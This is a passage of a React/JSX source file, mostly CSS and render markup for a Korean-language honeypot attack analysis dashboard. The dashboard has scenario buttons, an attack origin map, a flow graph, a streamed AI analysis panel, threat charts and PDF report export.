        .섹션설명 { font-size: 0.75rem; color: #94a3b8; margin-left: auto; }
        .왼쪽패널 { display: flex; flex-direction: column; gap: 14px; max-height: calc(100vh - 80px); overflow-y: auto; padding-right: 2px; }
        .왼쪽패널::-webkit-scrollbar { width: 4px; }
        .왼쪽패널::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 2px; }
        .시나리오버튼 { width: 100%; text-align: left; padding: 12px 14px; border: 1.5px solid #e8ecf0; border-radius: 11px; background: #fafafa; cursor: pointer; transition: all 0.2s; display: block; }
        .시나리오버튼:hover { border-color: #a5b4fc; background: #faf9ff; transform: translateX(2px); }
        .시나리오버튼.선택됨 { border-color: #6366f1; background: #eef2ff; box-shadow: 0 0 0 3px #6366f120; }
        .시나리오헤더행 { display: flex; align-items: center; gap: 8px; margin-bottom: 3px; }
        .시나리오아이콘 { font-size: 1.1rem; flex-shrink: 0; }
        .시나리오이름 { font-weight: 700; font-size: 0.87rem; color: #1e293b; flex: 1; }
        .시나리오설명 { font-size: 0.76rem; color: #64748b; display: block; padding-left: 28px; }
        .위험배지 { font-size: 0.68rem; font-weight: 700; padding: 2px 8px; border-radius: 20px; white-space: nowrap; }
        .위험배지.높음 { background: #fee2e2; color: #b91c1c; }
        .위험배지.보통 { background: #fef3c7; color: #92400e; }
        .위험배지.치명 { background: #18181b; color: #f87171; }
        .게이지카드제목 { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; font-size: 0.88rem; font-weight: 700; color: #1e293b; }
        .게이지레이블 { text-align: center; font-size: 0.77rem; color: #64748b; margin-top: 6px; }
        #분석시작버튼 { width: 100%; padding: 15px; border-radius: 12px; border: none; background: #0f172a; color: white; font-size: 0.95rem; font-weight: 700; cursor: pointer; transition: all 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px; }
        #분석시작버튼:hover:not(:disabled) { background: #1e293b; transform: translateY(-2px); box-shadow: 0 6px 20px rgba(15,23,42,0.3); }
        #분석시작버튼:disabled { background: #94a3b8; cursor: not-allowed; transform: none; box-shadow: none; }
        #PDF버튼 { width: 100%; padding: 11px; border-radius: 10px; border: none; background: linear-gradient(135deg, #6366f1, #8b5cf6); color: white; font-size: 0.88rem; font-weight: 700; cursor: pointer; transition: all 0.2s; display: flex; align-items: center; justify-content: center; gap: 7px; margin-top: 4px; }
        #PDF버튼:hover { transform: translateY(-1px); box-shadow: 0 4px 14px #6366f150; }
        .오른쪽패널 { display: flex; flex-direction: column; gap: 16px; }
        .그래프카드헤더 { display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; }
        .그래프카드헤더 .제목 { font-size: 0.88rem; font-weight: 700; color: #1e293b; }
        #네트워크SVG { width: 100%; height: 260px; border-radius: 10px; background: linear-gradient(180deg,#f8fafc 0%,#f1f5f9 100%); }
        .그래프범례 { display: flex; gap: 14px; margin-top: 10px; flex-wrap: wrap; align-items: center; }
        .범례항목 { display: flex; align-items: center; gap: 5px; font-size: 0.74rem; color: #64748b; }
        .범례점 { width: 9px; height: 9px; border-radius: 50%; flex-shrink: 0; }
        .단계목록 { display: flex; gap: 7px; flex-wrap: wrap; }
        .단계칩 { padding: 5px 12px; border-radius: 20px; font-size: 0.75rem; font-weight: 600; background: #f1f5f9; color: #94a3b8; transition: all 0.3s; border: 1.5px solid transparent; }
        .단계칩.진행중 { background: #fffbeb; color: #92400e; border-color: #fcd34d; animation: pulse 1.5s infinite; }
        .단계칩.완료 { background: #f0fdf4; color: #166534; border-color: #86efac; }
        .스트리밍헤더 { background: #0f172a; border-radius: 12px 12px 0 0; padding: 10px 16px; display: flex; align-items: center; justify-content: space-between; }
        .스트리밍헤더왼쪽 { display: flex; align-items: center; gap: 8px; }
        .스트리밍점 { width: 8px; height: 8px; border-radius: 50%; background: #22c55e; box-shadow: 0 0 8px #22c55e; animation: pulse 1.5s infinite; }
        .스트리밍제목 { color: #94a3b8; font-size: 0.78rem; font-family: monospace; }
        .스트리밍배지 { background: rgba(99,102,241,0.2); color: #a5b4fc; font-size: 0.68rem; font-weight: 700; padding: 2px 8px; border-radius: 10px; }
        .스트리밍본문 { background: #020817; border-radius: 0 0 12px 12px; padding: 14px 16px; max-height: 220px; overflow-y: auto; }
        #스트리밍텍스트 { font-family: "SF Mono","Fira Code",monospace; font-size: 0.79rem; color: #a5f3fc; line-height: 1.7; white-space: pre-wrap; word-break: break-all; }
        .커서 { display: inline-block; width: 7px; height: 14px; background: #a5f3fc; animation: 깜빡 0.8s infinite; vertical-align: text-bottom; border-radius: 1px; }
        @keyframes 깜빡 { 0%,100%{opacity:1} 50%{opacity:0} }
        .결과카드헤더 { display: flex; align-items: center; gap: 8px; margin-bottom: 16px; padding-bottom: 14px; border-bottom: 2px solid #f1f5f9; }
        .결과카드제목 { font-size: 1rem; font-weight: 800; color: #1e293b; }
        .결과카드부제 { font-size: 0.75rem; color: #94a3b8; margin-left: auto; }
        .요약카드 { background: #f8fafc; border-radius: 12px; padding: 16px; }
        .요약텍스트 { font-size: 0.92rem; line-height: 1.75; color: #1e293b; margin-bottom: 14px; }
        .포인트목록 { list-style: none; display: flex; flex-direction: column; gap: 6px; }
        .포인트목록 li { display: flex; align-items: flex-start; gap: 8px; font-size: 0.83rem; color: #374151; line-height: 1.6; }
        .포인트목록 li::before { content: "▸"; color: #6366f1; flex-shrink: 0; margin-top: 2px; font-size: 0.75rem; }
        .공격명배지 { display: inline-flex; align-items: center; gap: 5px; margin-top: 12px; background: #eef2ff; color: #3730a3; padding: 4px 12px; border-radius: 20px; font-size: 0.78rem; font-weight: 700; border: 1px solid #c7d2fe; }
        .결과그리드 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
        .분석칩카드 { background: #f8fafc; border-radius: 12px; padding: 14px; }
        .분석칩섹션제목 { font-size: 0.76rem; font-weight: 700; color: #64748b; margin-bottom: 10px; }
        .큰배지 { font-size: 0.85rem; font-weight: 800; padding: 5px 14px; border-radius: 8px; display: inline-block; margin-bottom: 10px; }
        .큰배지.정보수집,.큰배지.취약점탐색 { background: #dbeafe; color: #1d4ed8; }
        .큰배지.침투시도,.큰배지.데이터탈취 { background: #fee2e2; color: #dc2626; }
        .큰배지.서비스방해 { background: #ffedd5; color: #c2410c; }
        .큰배지.불명 { background: #f1f5f9; color: #64748b; }
        .큰배지.초보 { background: #dcfce7; color: #166534; }
        .큰배지.중급 { background: #fef9c3; color: #92400e; }
        .큰배지.고급 { background: #fee2e2; color: #dc2626; }
        .신뢰도바컨테이너 { margin: 10px 0 8px; }
        .신뢰도바컨테이너 .라벨 { font-size: 0.74rem; color: #64748b; margin-bottom: 5px; display: flex; justify-content: space-between; font-weight: 500; }
        .신뢰도바 { height: 8px; background: #e2e8f0; border-radius: 4px; overflow: hidden; }
        .신뢰도바 .채움 { height: 100%; background: linear-gradient(90deg,#6366f1,#8b5cf6); border-radius: 4px; transition: width 0.9s cubic-bezier(0.4,0,0.2,1); }
        .근거설명 { font-size: 0.81rem; color: #475569; line-height: 1.65; margin-top: 6px; }
        .권고카드 { background: #f8fafc; border-radius: 12px; padding: 16px; }
        .우선순위행 { display: flex; align-items: center; gap: 8px; margin-bottom: 14px; font-size: 0.8rem; color: #64748b; font-weight: 500; }
        .권고섹션제목 { font-size: 0.76rem; font-weight: 700; margin-bottom: 7px; }
        .권고섹션제목.즉각 { color: #dc2626; }
        .권고섹션제목.장기 { color: #2563eb; }
        .권고목록 { list-style: none; display: flex; flex-direction: column; gap: 5px; margin-bottom: 14px; }
        .권고목록 li { font-size: 0.81rem; color: #374151; padding: 8px 11px; border-radius: 8px; line-height: 1.55; }
        .권고목록.즉각 li { background: #fff1f2; border-left: 3px solid #f87171; }
        .권고목록.장기 li { background: #eff6ff; border-left: 3px solid #60a5fa; }
        .우선순위배지 { font-size: 0.74rem; font-weight: 700; padding: 3px 10px; border-radius: 20px; }
        .우선순위배지.즉시 { background: #fee2e2; color: #b91c1c; }
        .우선순위배지.시간 { background: #fef9c3; color: #92400e; }
        .우선순위배지.주 { background: #dbeafe; color: #1d4ed8; }
        .리포트서술박스 { background: linear-gradient(135deg,#f0f9ff,#f8f4ff); border-left: 4px solid #6366f1; padding: 16px; border-radius: 0 12px 12px 0; font-size: 0.87rem; line-height: 1.85; color: #1e293b; }
        .결과구분선 { border: none; border-top: 2px solid #f1f5f9; margin: 16px 0; }
        .빈상태 { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 48px 20px; color: #94a3b8; text-align: center; min-height: 280px; }
        .빈상태아이콘 { font-size: 3.5rem; margin-bottom: 16px; opacity: 0.7; }
        .빈상태제목 { font-size: 1rem; font-weight: 700; color: #64748b; margin-bottom: 8px; }
        .빈상태설명 { font-size: 0.82rem; line-height: 1.7; }
        .빈상태힌트 { margin-top: 20px; display: flex; flex-direction: column; gap: 6px; background: #f8fafc; border-radius: 10px; padding: 12px 18px; text-align: left; width: 100%; max-width: 300px; }
        .힌트행 { display: flex; align-items: center; gap: 8px; font-size: 0.78rem; color: #64748b; }
        .힌트번호 { width: 18px; height: 18px; border-radius: 50%; background: #e2e8f0; color: #64748b; font-size: 0.65rem; font-weight: 700; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
        .오류박스 { background: #fff1f2; border: 1px solid #fca5a5; border-radius: 12px; padding: 14px 16px; color: #dc2626; font-size: 0.85rem; line-height: 1.6; }
      `}</style>

      <header>
        <div className="헤더왼쪽">
          <span className="헤더로고">🍯</span>
          <div>
            <div className="헤더제목"><span>허니팟</span> 공격 분석 시스템</div>
            <div className="헤더부제">AI 기반 사이버 공격 자동 분석 · Powered by Llama 3.1</div>
          </div>
        </div>
        <div className="서버상태칩">
          <div style={{ width: 8, height: 8, borderRadius: "50%", background: 서버상태.연결됨 ? "#22c55e" : "#ef4444", boxShadow: 서버상태.연결됨 ? "0 0 6px #22c55e80" : undefined, flexShrink: 0, transition: "all 0.3s" }} />
          <span>{서버상태.연결됨 ? `AI 서버 연결됨 · ${서버상태.모델}` : "서버 연결 안됨"}</span>
        </div>
      </header>

      <div className="레이아웃">
        {/* ── 왼쪽 패널 ── */}
        <div className="왼쪽패널">
          <div className="카드">
            <div className="섹션헤더">
              <div className="섹션번호">1</div>
              <span className="섹션제목">공격 시나리오 선택</span>
              <span className="섹션설명">4가지 내장 예시</span>
            </div>
            <div style={{ display: "flex", flexDirection: "column", gap: 7 }}>
              {시나리오목록.map((s) => (
                <button key={s.id} className={`시나리오버튼 ${선택시나리오?.id === s.id ? "선택됨" : ""}`} onClick={() => 시나리오선택(s.id)}>
                  <div className="시나리오헤더행">
                    <span className="시나리오아이콘">{s.아이콘}</span>
                    <span className="시나리오이름">{s.이름}</span>
                    <span className={`위험배지 ${s.위험}`}>{s.위험}</span>
                  </div>
                  <span className="시나리오설명">{s.설명}</span>
                </button>
              ))}
            </div>
          </div>

          {showGauge && 건강점수 !== null && (
            <div className="카드" style={{ padding: "16px 20px 10px" }}>
              <div className="게이지카드제목">🛡️ 보안 건강 점수</div>
              <svg ref={게이지SVGRef} id="게이지SVG" viewBox="0 0 220 115" style={{ display: "block", width: "100%", overflow: "visible" }} />
              <div className="게이지레이블">
                보안 상태: <strong style={{ color: 활성색 }}>{건강라벨}</strong> &nbsp;·&nbsp; 위험 점수 {선택시나리오?.데이터.위험점수.toFixed(1)}/100
              </div>
            </div>
          )}

          <button id="분석시작버튼" onClick={분석시작} disabled={분석중 || !선택시나리오}>
            <span>{분석중 ? "⏳" : "🔍"}</span>
            <span>{분석중 ? "AI가 분석하는 중..." : "AI 분석 시작"}</span>
          </button>

          {showPDF && (
            <button id="PDF버튼" onClick={PDF저장}>
              <span>📄</span><span>리포트 PDF 저장</span>
            </button>
          )}
        </div>

        {/* ── 오른쪽 패널 ── */}
        <div className="오른쪽패널">
          {/* ── 어택맵 ── */}
          <div className="카드" style={{ padding: "16px 20px 14px" }}>
            <div className="그래프카드헤더">
              <span className="제목">🌍 실시간 공격 발원지 지도</span>
              <span style={{ fontSize: "0.74rem", color: "#94a3b8" }}>
                {선택시나리오 ? `${선택시나리오.데이터.공격자국가} 강조 표시` : "시나리오를 선택하면 강조됩니다"}
              </span>
            </div>
            <AttackMap
              공격={어택맵데이터}
              허니팟ID={선택시나리오?.데이터.허니팟ID}
            />
          </div>

          {showGraph && (
            <div className="카드" style={{ padding: "16px 20px 14px" }}>
              <div className="그래프카드헤더">
                <span className="제목">🕸️ 공격 흐름 시각화</span>
              </div>
              <svg ref={네트워크SVGRef} id="네트워크SVG" />
              <div className="그래프범례">
                <div className="범례항목"><div className="범례점" style={{ background: "#fee2e2", border: "2px solid #ef4444" }} />공격자 IP</div>
                <div className="범례항목"><div className="범례점" style={{ background: "#eef2ff", border: "2px solid #6366f1" }} />허니팟</div>
                <div className="범례항목"><div className="범례점" style={{ background: "#f8fafc", border: "2px solid #cbd5e1" }} />공격 행위 단계</div>
                <div style={{ marginLeft: "auto", fontSize: "0.72rem", color: "#94a3b8" }}>→ 빨간 점: 실시간 공격 흐름</div>
              </div>
            </div>
          )}

          {showSteps && (
            <div className="카드">
              <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
                <span style={{ fontSize: "0.88rem", fontWeight: 700, color: "#1e293b" }}>⏳ 분석 진행 단계</span>
              </div>
              <div className="단계목록">
                {단계이름.map((n, i) => (
                  <div key={n} className={`단계칩 ${단계칩[i]?.상태 ?? "pending"}`}>{i + 1}. {n}</div>
                ))}
              </div>
            </div>
          )}

          {showStreaming && (
            <div className="카드" style={{ padding: 0, overflow: "hidden" }}>
              <div className="스트리밍헤더">
                <div className="스트리밍헤더왼쪽">
                  <div className="스트리밍점" />
                  <span className="스트리밍제목">AI 실시간 추론 중...</span>
                </div>
                <span className="스트리밍배지">LIVE</span>
              </div>
              <div className="스트리밍본문" ref={스트리밍본문Ref}>
                <span id="스트리밍텍스트">{스트리밍텍스트}</span>
                {커서보임 && <span className="커서" />}
              </div>
            </div>
          )}

          {결과HTML && (
            <div dangerouslySetInnerHTML={{ __html: 결과HTML }} />
          )}

          {차트HTML === "__RENDER_CHARTS__" && (
            <div className="카드" style={{ marginBottom: 0 }}>
              <div className="결과카드헤더" style={{ marginBottom: 12 }}>
                <span className="결과카드제목">📊 위협 분석 차트</span>
                <span className="결과카드부제">AI 분석 지표 시각화</span>
              </div>
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 20, alignItems: "start" }}>
                <div>
                  <div style={{ fontSize: "0.78rem", fontWeight: 700, color: "#64748b", marginBottom: 10, textAlign: "center" }}>🕸️ 위협 레이더</div>
                  <svg ref={레이더SVGRef} viewBox="0 0 280 260" style={{ width: "100%", display: "block" }} />
                </div>
                <div>
                  <div style={{ fontSize: "0.78rem", fontWeight: 700, color: "#64748b", marginBottom: 10, textAlign: "center" }}>📈 분석 지표</div>
                  <svg ref={바차트SVGRef} viewBox="0 0 280 230" style={{ width: "100%", display: "block" }} />
                </div>
              </div>
            </div>
          )}

          {showEmpty && (
            <div className="카드 빈상태">
              <div className="빈상태아이콘">🛡️</div>
              <div className="빈상태제목">공격 분석을 시작하세요</div>
              <p className="빈상태설명">공격 시나리오를 선택하고 AI 분석을 실행하세요.</p>
              <div className="빈상태힌트">
                <div className="힌트행"><div className="힌트번호">1</div>왼쪽에서 공격 시나리오를 선택하세요</div>
                <div className="힌트행"><div className="힌트번호">2</div>&#39;AI 분석 시작&#39; 버튼을 누르세요</div>
                <div className="힌트행"><div className="힌트번호">3</div>전체 리포트와 차트가 자동 생성됩니다</div>
              </div>
            </div>
          )}
        </div>
      </div>
    </>
  );
}
